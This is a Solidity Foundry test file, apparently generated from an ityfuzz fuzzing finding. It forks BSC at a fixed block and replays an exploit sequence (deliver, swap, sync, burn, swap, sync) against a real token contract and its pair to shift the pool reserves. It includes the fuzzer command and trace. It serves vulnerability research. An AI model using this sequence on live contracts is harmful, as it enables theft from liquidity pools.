// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4,0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24 -c bsc --onchain-block-number 25543755 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x912dcfbf1105504fb4ff8ce351beb4d929ce9c24, Reserves changed from (0x0000000000000000000000000000000000000001000000032b72ab18231d6562_U256, 0x0000000000000000000000000000000000000000000000016fece99af0bfd050_U256) to (0x0000000000000000000000000000000000000001000000032b72ab18231d6562_U256, 0x0000000000000000000000000000000000000000000000016fece99af0bfd4ba_U256)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.deliver(1.1529 Ether)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4 → WETH), address(this), block.timestamp);
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24.sync()
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.burn(3009)
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4 → WETH), address(this), block.timestamp);
   └─[1] 0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24.sync()


 */

contract C0025 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 25543755);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.call(abi.encodeWithSignature(
            "deliver(uint256)",1.1529 Ether
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4).balanceOf(address(this));
        IERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24).sync();
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4.call(abi.encodeWithSignature(
            "burn(uint256)",3009
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount1 = IERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4).balanceOf(address(this));
        IERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4).approve(router, amount1);
        address[] memory liq_path1 = new address[](2);
        liq_path1[0] = 0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4;
        liq_path1[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
